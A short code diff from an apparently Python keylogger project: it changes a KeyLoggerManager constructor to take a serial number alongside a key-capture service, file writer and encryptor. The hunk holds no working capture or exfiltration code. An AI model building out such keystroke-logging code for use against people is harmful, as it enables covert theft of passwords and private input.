@@ -4,7 +4,8 @@ from pynput.keyboard import Listener
 import threading,time
 
 class KeyLoggerManager(IKeyLoggerManager):
-    def __init__(self):
+    def __init__(self,serial_number:int):
+        self.__serial_number = serial_number
         self.__key_logger = KeyLoggerService()
         self.__writer = FileWriter()
         self.__encryptor = Encryptor()
